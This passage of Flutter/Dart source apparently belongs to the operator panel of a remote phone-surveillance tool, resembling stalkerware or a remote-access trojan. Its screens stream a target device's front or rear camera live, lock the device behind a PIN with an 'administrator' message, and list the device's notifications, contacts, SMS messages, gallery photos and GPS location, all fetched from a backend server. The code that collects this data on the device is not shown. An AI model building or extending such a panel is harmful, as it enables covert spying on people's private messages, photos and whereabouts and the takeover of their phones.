                          color: _kBorder.withOpacity(0.4),
                          offset: const Offset(4, 4),
                          blurRadius: 0),
                    ]
                  : null,
            ),
            child: _chat.isEmpty
                ? Center(
                    child: Text('No messages',
                        style: TextStyle(
                            color: _kTextSecondary,
                            fontSize: 12,
                            fontWeight: FontWeight.w800,
                            letterSpacing: 2)))
                : ListView.builder(
                    controller: _chatScroll,
                    padding: const EdgeInsets.all(12),
                    itemCount: _chat.length,
                    itemBuilder: (_, i) {
                      final m = _chat[i];
                      final isOwner = m['from'] == 'owner';
                      return Align(
                        alignment: isOwner
                            ? Alignment.centerRight
                            : Alignment.centerLeft,
                        child: Container(
                          margin: const EdgeInsets.symmetric(vertical: 4),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 12, vertical: 8),
                          constraints: BoxConstraints(
                              maxWidth:
                                  MediaQuery.of(context).size.width * 0.7),
                          decoration: BoxDecoration(
                            color: isOwner ? _kBorder : _kCardAlt,
                            borderRadius:
                                BorderRadius.circular(_is3DNeo ? 0 : 16),
                            border: Border.all(color: _kBorder, width: 1.5),
                            boxShadow: _is3DNeo
                                ? [
                                    BoxShadow(
                                        color: _kBorder.withOpacity(0.4),
                                        offset: const Offset(3, 3),
                                        blurRadius: 0),
                                  ]
                                : null,
                          ),
                          child: Column(
                              crossAxisAlignment: isOwner
                                  ? CrossAxisAlignment.end
                                  : CrossAxisAlignment.start,
                              children: [
                                Text(m['text'] ?? '',
                                    style: TextStyle(
                                        color: isOwner ? Colors.white : _kText,
                                        fontSize: 13,
                                        fontWeight: FontWeight.w600)),
                                const SizedBox(height: 2),
                                Text(m['time'] ?? '',
                                    style: TextStyle(
                                        color: isOwner
                                            ? Colors.white70
                                            : _kTextSecondary,
                                        fontSize: 9,
                                        fontWeight: FontWeight.w600)),
                              ]),
                        ),
                      );
                    }),
          ),
        ]),
      ),
      Container(
        padding: const EdgeInsets.fromLTRB(16, 10, 16, 12),
        decoration: BoxDecoration(
          color: _kCard,
          border: Border(
              top: BorderSide(color: _kBorder, width: 1.8)),
        ),
        child: Row(children: [
          Expanded(
              child: TextField(
            controller: _chatCtrl,
            style: const TextStyle(
                color: _kText, fontSize: 14, fontWeight: FontWeight.w600),
            decoration: InputDecoration(
              hintText: 'Type a message...',
              hintStyle: TextStyle(
                  color: _kTextSecondary.withOpacity(0.6), fontSize: 13),
              filled: true,
              fillColor: _kCardAlt,
              contentPadding:
                  const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 24),
                  borderSide: BorderSide(color: _kBorder, width: 1.5)),
              enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 24),
                  borderSide: BorderSide(color: _kBorder, width: 1.5)),
              focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 24),
                  borderSide: BorderSide(color: _kBorder, width: 2.5)),
            ),
            onSubmitted: _sendChat,
          )),
          const SizedBox(width: 10),
          GestureDetector(
            onTap: () => _sendChat(_chatCtrl.text),
            child: Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: _kBorder,
                shape: _is3DNeo ? BoxShape.rectangle : BoxShape.circle,
                borderRadius: _is3DNeo ? BorderRadius.circular(0) : null,
                border: _is3DNeo
                    ? Border.all(color: _kRed, width: 2)
                    : null,
                boxShadow: [
                  BoxShadow(
                      color: _kBorder.withOpacity(0.5),
                      blurRadius: _is3DNeo ? 0 : 12,
                      offset: _is3DNeo ? const Offset(3, 3) : Offset.zero)
                ],
              ),
              child: const Icon(Icons.send, color: Colors.white, size: 18),
            ),
          ),
        ]),
      ),
    ]);
  }

  // ── DIALOGS ────────────────────────────────────────────────────
  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: _kCard,
          insetPadding: const EdgeInsets.all(8),
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 16),
              side: BorderSide(color: _kBorder, width: 2)),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                  color: _kCard,
                  borderRadius: BorderRadius.vertical(
                      top: Radius.circular(_is3DNeo ? 0 : 16)),
                  border: Border(
                      bottom: BorderSide(color: _kBorder, width: 1.5))),
              child: Row(children: [
                Container(
                    width: 8,
                    height: 8,
                    decoration: BoxDecoration(
                        color: _kBorder, shape: BoxShape.circle)),
                const SizedBox(width: 10),
                Text('LIVE · $_liveTitle',
                    style: const TextStyle(
                        color: _kText,
                        fontSize: 13,
                        fontWeight: FontWeight.w700)),
                const Spacer(),
                Container(
                    padding:
                        const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                    decoration: BoxDecoration(
                        color: _kSuccess.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 4),
                        border: Border.all(color: _kSuccess, width: 1.5)),
                    child: Text('$_fps fps',
                        style: const TextStyle(
                            color: _kSuccess,
                            fontSize: 10,
                            fontWeight: FontWeight.w800))),
              ]),
            ),
            Container(
              constraints: BoxConstraints(
                  maxHeight: MediaQuery.of(context).size.height * 0.55),
              color: _kBg,
              child: _frame != null
                  ? Image.memory(_frame!,
                      fit: BoxFit.contain, gaplessPlayback: true)
                  : const SizedBox(
                      height: 200,
                      child: Center(
                          child: CircularProgressIndicator(
                              color: _kBorder, strokeWidth: 2))),
            ),
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                  color: _kCard,
                  borderRadius: BorderRadius.vertical(
                      bottom: Radius.circular(_is3DNeo ? 0 : 16))),
              child: Row(children: [
                Expanded(
                    child: OutlinedButton.icon(
                  style: OutlinedButton.styleFrom(
                      side: BorderSide(color: _kBorder, width: 1.8),
                      shape: RoundedRectangleBorder(
                          borderRadius:
                              BorderRadius.circular(_is3DNeo ? 0 : 8))),
                  icon: const Icon(Icons.cameraswitch,
                      color: _kBorder, size: 16),
                  label: const Text('Switch',
                      style: TextStyle(color: _kBorder, fontSize: 12)),
                  onPressed: () {
                    final isFront = _liveTitle.contains('Front');
                    _stopLive();
                    Future.delayed(const Duration(milliseconds: 300),
                        () => _startLive('live_camera_start',
                            isFront ? 'back' : 'front'));
                  },
                )),
                const SizedBox(width: 10),
                Expanded(
                    child: ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(
                      backgroundColor: _kRed,
                      shape: RoundedRectangleBorder(
                          borderRadius:
                              BorderRadius.circular(_is3DNeo ? 0 : 8))),
                  icon: const Icon(Icons.stop, color: Colors.white, size: 16),
                  label: const Text('Stop',
                      style: TextStyle(
                          color: Colors.white,
                          fontSize: 12,
                          fontWeight: FontWeight.w700)),
                  onPressed: () {
                    _stopLive();
                    Navigator.pop(ctx);
                  },
                )),
              ]),
            ),
          ]),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _lockLiveDialog() {
    final msgCtrl = TextEditingController();
    final pinCtrl = TextEditingController();
    showDialog(
        context: context,
        builder: (_) => AlertDialog(
              backgroundColor: _kCard,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                  side: BorderSide(color: _kBorder, width: 2)),
              title: const Text('Lock + Chat',
                  style: TextStyle(
                      color: _kText,
                      fontSize: 15,
                      fontWeight: FontWeight.w700)),
              content: Column(mainAxisSize: MainAxisSize.min, children: [
                const Text('Lock device and enable two-way chat',
                    style: TextStyle(color: _kTextSecondary, fontSize: 12)),
                const SizedBox(height: 14),
                _field(msgCtrl, 'Lock message',
                    hint: 'Device locked by administrator'),
                const SizedBox(height: 12),
                _field(pinCtrl, 'Unlock PIN', hint: '1234', isNum: true),
              ]),
              actions: [
                TextButton(
                    onPressed: () => Navigator.pop(context),
                    child: const Text('Cancel',
                        style: TextStyle(color: _kTextSecondary))),
                ElevatedButton(
                    style: ElevatedButton.styleFrom(
                        backgroundColor: _kBorder,
                        shape: RoundedRectangleBorder(
                            borderRadius:
                                BorderRadius.circular(_is3DNeo ? 0 : 8))),
                    onPressed: () {
                      Navigator.pop(context);
                      final msg = msgCtrl.text.trim().isEmpty
                          ? 'DEVICE LOCKED'
                          : msgCtrl.text.trim();
                      final pin = pinCtrl.text.trim().isEmpty
                          ? '1234'
                          : pinCtrl.text.trim();
                      _cmd('lock_live', extra: '$msg|$pin');
                    },
                    child: const Text('LOCK',
                        style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w700))),
              ],
            ));
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
        context: context,
        builder: (_) => StatefulBuilder(
              builder: (ctx, ss) => AlertDialog(
                backgroundColor: _kCard,
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                    side: BorderSide(color: _kBorder, width: 2)),
                title: const Text('Select Camera',
                    style: TextStyle(
                        color: _kText,
                        fontSize: 14,
                        fontWeight: FontWeight.w700)),
                content: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                    children: ['back', 'front'].map((v) {
                      final isSel = sel == v;
                      return GestureDetector(
                        onTap: () => ss(() => sel = v),
                        child: Container(
                          padding: const EdgeInsets.symmetric(
                              horizontal: 20, vertical: 12),
                          decoration: BoxDecoration(
                              color: isSel
                                  ? _kBorder.withOpacity(0.15)
                                  : Colors.transparent,
                              borderRadius:
                                  BorderRadius.circular(_is3DNeo ? 0 : 8),
                              border: Border.all(
                                  color: isSel ? _kBorder : _kTextDim,
                                  width: isSel ? 2 : 1.5)),
                          child: Column(children: [
                            Icon(
                                v == 'back'
                                    ? Icons.camera_rear
                                    : Icons.camera_front,
                                color: isSel ? _kBorder : _kTextSecondary,
                                size: 28),
                            const SizedBox(height: 6),
                            Text(v == 'back' ? 'Rear' : 'Front',
                                style: TextStyle(
                                    color:
                                        isSel ? _kBorder : _kTextSecondary,
                                    fontSize: 12,
                                    fontWeight: FontWeight.w700)),
                          ]),
                        ),
                      );
                    }).toList()),
                actions: [
                  TextButton(
                      onPressed: () => Navigator.pop(ctx),
                      child: const Text('Cancel',
                          style: TextStyle(color: _kTextSecondary))),
                  ElevatedButton(
                      style: ElevatedButton.styleFrom(
                          backgroundColor: _kBorder,
                          shape: RoundedRectangleBorder(
                              borderRadius:
                                  BorderRadius.circular(_is3DNeo ? 0 : 8))),
                      onPressed: () {
                        Navigator.pop(ctx);
                        onPick(sel);
                      },
                      child: const Text('Select',
                          style: TextStyle(
                              color: Colors.white,
                              fontWeight: FontWeight.w700))),
                ],
              ),
            ));
  }

  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(
        context: context,
        builder: (_) => AlertDialog(
              backgroundColor: _kCard,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                  side: BorderSide(color: _kBorder, width: 2)),
              title: Text(title,
                  style: const TextStyle(
                      color: _kText,
                      fontSize: 14,
                      fontWeight: FontWeight.w700)),
              content: _field(ctrl, label, hint: hint, isNum: isNumber),
              actions: [
                TextButton(
                    onPressed: () => Navigator.pop(context),
                    child: const Text('Cancel',
                        style: TextStyle(color: _kTextSecondary))),
                ElevatedButton(
                    style: ElevatedButton.styleFrom(
                        backgroundColor: _kBorder,
                        shape: RoundedRectangleBorder(
                            borderRadius:
                                BorderRadius.circular(_is3DNeo ? 0 : 8))),
                    onPressed: () {
                      Navigator.pop(context);
                      onDone(ctrl.text.trim());
                    },
                    child: const Text('Send',
                        style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w700))),
              ],
            ));
  }

  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res =
          await http.get(Uri.parse('$_kBase/api/get-notifications/$_id'));
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('${list.length} notifications');
        showModalBottomSheet(
            context: context,
            backgroundColor: _kCard,
            isScrollControlled: true,
            shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.vertical(
                    top: Radius.circular(_is3DNeo ? 0 : 16)),
                side: BorderSide(color: _kBorder, width: 2)),
            builder: (_) => DraggableScrollableSheet(
                initialChildSize: 0.6,
                maxChildSize: 0.9,
                expand: false,
                builder: (_, sc) => Column(children: [
                      Container(
                          height: 4,
                          width: 40,
                          margin:
                              const EdgeInsets.only(top: 10, bottom: 10),
                          decoration: BoxDecoration(
                              color: _kBorder,
                              borderRadius:
                                  BorderRadius.circular(_is3DNeo ? 0 : 2))),
                      const Text('Notifications',
                          style: TextStyle(
                              color: _kText,
                              fontWeight: FontWeight.w700,
                              fontSize: 15)),
                      const SizedBox(height: 8),
                      Expanded(
                          child: ListView.separated(
                              controller: sc,
                              padding:
                                  const EdgeInsets.symmetric(horizontal: 16),
                              itemCount: list.length,
                              separatorBuilder: (_, __) =>
                                  Divider(color: _kBorder, height: 1),
                              itemBuilder: (_, i) => ListTile(
                                    contentPadding:
                                        const EdgeInsets.symmetric(
                                            horizontal: 0, vertical: 4),
                                    leading: Container(
                                        width: 40,
                                        height: 40,
                                        decoration: BoxDecoration(
                                            color:
                                                _kPurple.withOpacity(0.12),
                                            borderRadius:
                                                BorderRadius.circular(
                                                    _is3DNeo ? 0 : 8),
                                            border: Border.all(
                                                color: _kBorder, width: 1.5)),
                                        child: const Icon(Icons.notifications,
                                            color: _kPurple, size: 20)),
                                    title: Text(
                                        list[i]['title']?.toString() ?? '-',
                                        style: const TextStyle(
                                            color: _kText,
                                            fontSize: 13,
                                            fontWeight: FontWeight.w700)),
                                    subtitle: Text(
                                        list[i]['body']?.toString() ?? '',
                                        style: const TextStyle(
                                            color: _kTextSecondary,
                                            fontSize: 12)),
                                  ))),
                    ])));
      }
    } catch (_) {
      _addLog('Notif error');
    }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
          context: context,
          builder: (_) => Dialog(
                backgroundColor: _kCard,
                insetPadding: const EdgeInsets.all(16),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 16),
                    side: BorderSide(color: _kBorder, width: 2)),
                child: Column(mainAxisSize: MainAxisSize.min, children: [
                  Padding(
                      padding: const EdgeInsets.all(16),
                      child: Text(title,
                          style: const TextStyle(
                              color: _kText,
                              fontWeight: FontWeight.w700,
                              fontSize: 14))),
                  ClipRRect(
                      borderRadius: BorderRadius.vertical(
                          bottom: Radius.circular(_is3DNeo ? 0 : 16)),
                      child: Image.memory(bytes, fit: BoxFit.contain)),
                ]),
              ));
    } catch (_) {
      _toast('Failed to decode image', c: _kRed);
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(
        context: context,
        builder: (_) => AlertDialog(
              backgroundColor: _kCard,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                  side: BorderSide(color: _kBorder, width: 2)),
              title: const Text('Location',
                  style: TextStyle(
                      color: _kText,
                      fontSize: 14,
                      fontWeight: FontWeight.w700)),
              content: Column(mainAxisSize: MainAxisSize.min, children: [
                Text('Lat:  $lat',
                    style: const TextStyle(
                        color: _kSuccess,
                        fontFamily: 'monospace',
                        fontSize: 13,
                        fontWeight: FontWeight.w700)),
                const SizedBox(height: 6),
                Text('Lng: $lng',
                    style: const TextStyle(
                        color: _kSuccess,
                        fontFamily: 'monospace',
                        fontSize: 13,
                        fontWeight: FontWeight.w700)),
              ]),
              actions: [
                TextButton(
                    onPressed: () => Navigator.pop(context),
                    child: const Text('Close',
                        style: TextStyle(color: _kTextSecondary))),
                ElevatedButton(
                    style: ElevatedButton.styleFrom(
                        backgroundColor: _kSuccess,
                        shape: RoundedRectangleBorder(
                            borderRadius:
                                BorderRadius.circular(_is3DNeo ? 0 : 8))),
                    onPressed: () => launchUrl(
                        Uri.parse(
                            'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
                        mode: LaunchMode.externalApplication),
                    child: const Text('Open Maps',
                        style: TextStyle(
                            color: Colors.white,
                            fontWeight: FontWeight.w700))),
              ],
            ));
  }

  void _textDialog(String title, String content) {
    showDialog(
        context: context,
        builder: (_) => AlertDialog(
              backgroundColor: _kCard,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 12),
                  side: BorderSide(color: _kBorder, width: 2)),
              title: Text(title,
                  style: const TextStyle(
                      color: _kText,
                      fontSize: 14,
                      fontWeight: FontWeight.w700)),
              content: Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                      color: _kCardAlt,
                      borderRadius:
                          BorderRadius.circular(_is3DNeo ? 0 : 8),
                      border: Border.all(color: _kBorder, width: 1.5)),
                  child: SelectableText(content,
                      style: const TextStyle(
                          color: _kSuccess,
                          fontFamily: 'monospace',
                          fontSize: 12,
                          fontWeight: FontWeight.w700))),
              actions: [
                TextButton(
                    onPressed: () => Navigator.pop(context),
                    child: const Text('Close',
                        style: TextStyle(color: _kTextSecondary)))
              ],
            ));
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(
        context: context,
        backgroundColor: _kCard,
        isScrollControlled: true,
        shape: RoundedRectangleBorder(
            borderRadius:
                BorderRadius.vertical(top: Radius.circular(_is3DNeo ? 0 : 16)),
            side: BorderSide(color: _kBorder, width: 2)),
        builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(children: [
                  Container(
                      height: 4,
                      width: 40,
                      margin: const EdgeInsets.only(top: 10, bottom: 10),
                      decoration: BoxDecoration(
                          color: _kBorder,
                          borderRadius:
                              BorderRadius.circular(_is3DNeo ? 0 : 2))),
                  Text('Contacts (${contacts.length})',
                      style: const TextStyle(
                          color: _kText,
                          fontWeight: FontWeight.w700,
                          fontSize: 15)),
                  const SizedBox(height: 8),
                  Expanded(
                      child: ListView.separated(
                          controller: sc,
                          padding: const EdgeInsets.symmetric(horizontal: 16),
                          itemCount: contacts.length,
                          separatorBuilder: (_, __) =>
                              Divider(color: _kBorder, height: 1),
                          itemBuilder: (_, i) => ListTile(
                                contentPadding: const EdgeInsets.symmetric(
                                    horizontal: 0, vertical: 2),
                                leading: Container(
                                    width: 40,
                                    height: 40,
                                    decoration: BoxDecoration(
                                        color: _kBorder.withOpacity(0.12),
                                        borderRadius: BorderRadius.circular(
                                            _is3DNeo ? 0 : 8),
                                        border: Border.all(
                                            color: _kBorder, width: 1.5)),
                                    child: const Icon(Icons.person,
                                        color: _kBorder, size: 20)),
                                title: Text(
                                    contacts[i]['name']?.toString() ?? '-',
                                    style: const TextStyle(
                                        color: _kText,
                                        fontSize: 13,
                                        fontWeight: FontWeight.w700)),
                                subtitle: Text(
                                    contacts[i]['number']?.toString() ?? '-',
                                    style: const TextStyle(
                                        color: _kTextSecondary,
                                        fontSize: 12)),
                              ))),
                ])));
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(
        context: context,
        backgroundColor: _kCard,
        isScrollControlled: true,
        shape: RoundedRectangleBorder(
            borderRadius:
                BorderRadius.vertical(top: Radius.circular(_is3DNeo ? 0 : 16)),
            side: BorderSide(color: _kBorder, width: 2)),
        builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.75,
            maxChildSize: 0.95,
            expand: false,
            builder: (_, sc) => Column(children: [
                  Container(
                      height: 4,
                      width: 40,
                      margin: const EdgeInsets.only(top: 10, bottom: 10),
                      decoration: BoxDecoration(
                          color: _kBorder,
                          borderRadius:
                              BorderRadius.circular(_is3DNeo ? 0 : 2))),
                  Text('SMS (${sms.length})',
                      style: const TextStyle(
                          color: _kText,
                          fontWeight: FontWeight.w700,
                          fontSize: 15)),
                  const SizedBox(height: 8),
                  Expanded(
                      child: ListView.separated(
                          controller: sc,
                          padding: const EdgeInsets.symmetric(horizontal: 16),
                          itemCount: sms.length,
                          separatorBuilder: (_, __) =>
                              Divider(color: _kBorder, height: 1),
                          itemBuilder: (_, i) {
                            final s = sms[i] as Map;
                            return ListTile(
                                contentPadding: const EdgeInsets.symmetric(
                                    horizontal: 0, vertical: 4),
                                leading: Container(
                                    width: 40,
                                    height: 40,
                                    decoration: BoxDecoration(
                                        color: _kCyan.withOpacity(0.12),
                                        borderRadius: BorderRadius.circular(
                                            _is3DNeo ? 0 : 8),
                                        border: Border.all(
                                            color: _kBorder, width: 1.5)),
                                    child: const Icon(Icons.chat_bubble,
                                        color: _kCyan, size: 20)),
                                title: Text(
                                    s['address']?.toString() ?? '-',
                                    style: const TextStyle(
                                        color: _kText,
                                        fontSize: 13,
                                        fontWeight: FontWeight.w700)),
                                subtitle: Text(s['body']?.toString() ?? '',
                                    style: const TextStyle(
                                        color: _kTextSecondary, fontSize: 12),
                                    maxLines: 2,
                                    overflow: TextOverflow.ellipsis));
                          })),
                ])));
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
        context: context,
        backgroundColor: _kCard,
        isScrollControlled: true,
        shape: RoundedRectangleBorder(
            borderRadius:
                BorderRadius.vertical(top: Radius.circular(_is3DNeo ? 0 : 16)),
            side: BorderSide(color: _kBorder, width: 2)),
        builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.75,
            maxChildSize: 0.95,
            expand: false,
            builder: (_, sc) => Column(children: [
                  Container(
                      height: 4,
                      width: 40,
                      margin: const EdgeInsets.only(top: 10, bottom: 10),
                      decoration: BoxDecoration(
                          color: _kBorder,
                          borderRadius:
                              BorderRadius.circular(_is3DNeo ? 0 : 2))),
                  Text('Gallery (${imgs.length})',
                      style: const TextStyle(
                          color: _kText,
                          fontWeight: FontWeight.w700,
                          fontSize: 15)),
                  const SizedBox(height: 8),
                  Expanded(
                      child: imgs.isEmpty
                          ? const Center(
                              child: Text('No photos',
                                  style:
                                      TextStyle(color: _kTextSecondary)))
                          : GridView.builder(
                              controller: sc,
                              padding: const EdgeInsets.all(10),
                              gridDelegate:
                                  const SliverGridDelegateWithFixedCrossAxisCount(
                                      crossAxisCount: 3,
                                      crossAxisSpacing: 6,
                                      mainAxisSpacing: 6),
                              itemCount: imgs.length,
                              itemBuilder: (_, i) {
                                try {
                                  final raw = imgs[i].toString();
                                  final clean = raw.contains(',')
                                      ? raw.split(',').last
                                      : raw;
                                  final bytes = base64Decode(clean);
                                  return GestureDetector(
                                      onTap: () =>
                                          _imgDialog(raw, 'Photo ${i + 1}'),
                                      child: ClipRRect(
                                          borderRadius: BorderRadius.circular(
                                              _is3DNeo ? 0 : 8),
                                          child: Image.memory(bytes,
                                              fit: BoxFit.cover)));
                                } catch (_) {
                                  return Container(
                                      decoration: BoxDecoration(
                                          color: _kCardAlt,
                                          borderRadius: BorderRadius.circular(
                                              _is3DNeo ? 0 : 8),
                                          border: Border.all(
                                              color: _kBorder, width: 1.5)));
                                }
                              })),
                ])));
  }

  Widget _actionBtn(String label, Color color, dynamic icon,
          VoidCallback fn) =>
      Padding(
        padding: const EdgeInsets.only(bottom: 8),
        child: InkWell(
          onTap: fn,
          borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 10),
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
            decoration: BoxDecoration(
              color: _kCardAlt,
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 10),
              border: Border.all(color: _kBorder, width: 1.5),
              boxShadow: _is3DNeo
                  ? [
                      BoxShadow(
                          color: _kBorder.withOpacity(0.4),
                          offset: const Offset(3, 3),
                          blurRadius: 0),
                    ]
                  : null,
            ),
            child: Row(children: [
              Container(
                width: 32,
                height: 32,
                decoration: BoxDecoration(
                  color: color.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 8),
                  border: Border.all(color: _kBorder, width: 1.2),
                ),
                child: Icon(icon, color: color, size: 16),
              ),
              const SizedBox(width: 12),
              Expanded(
                  child: Text(label,
                      style: const TextStyle(
                          color: _kText,
                          fontSize: 13,
                          fontWeight: FontWeight.w700))),
              Icon(Icons.chevron_right,
                  color: _kBorder.withOpacity(0.5), size: 18),
            ]),
          ),
        ),
      );

  Widget _infoRow(String num, String text) => Padding(
        padding: const EdgeInsets.symmetric(vertical: 4),
        child: Row(children: [
          Container(
              width: 22,
              height: 22,
              decoration: BoxDecoration(
                  color: _kWarning.withOpacity(0.15),
                  borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 4),
                  border: Border.all(color: _kBorder, width: 1.2)),
              child: Center(
                  child: Text(num,
                      style: const TextStyle(
                          color: _kWarning,
                          fontSize: 10,
                          fontWeight: FontWeight.w900)))),
          const SizedBox(width: 12),
          Expanded(
              child: Text(text,
                  style: const TextStyle(
                      color: _kTextSecondary, fontSize: 11))),
        ]),
      );

  Widget _field(TextEditingController ctrl, String label,
          {String hint = '', bool isNum = false}) =>
      TextField(
        controller: ctrl,
        keyboardType: isNum ? TextInputType.number : TextInputType.text,
        style: const TextStyle(
            color: _kText, fontSize: 14, fontWeight: FontWeight.w600),
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          labelStyle:
              const TextStyle(color: _kTextSecondary, fontSize: 12),
          hintStyle: const TextStyle(color: _kTextDim, fontSize: 12),
          filled: true,
          fillColor: _kCardAlt,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 8),
              borderSide: BorderSide(color: _kBorder, width: 1.5)),
          enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 8),
              borderSide: BorderSide(color: _kBorder, width: 1.5)),
          focusedBorder: OutlineInputBorder(
              borderRadius: BorderRadius.circular(_is3DNeo ? 0 : 8),
              borderSide: BorderSide(color: _kBorder, width: 2.5)),
        ),
      );
}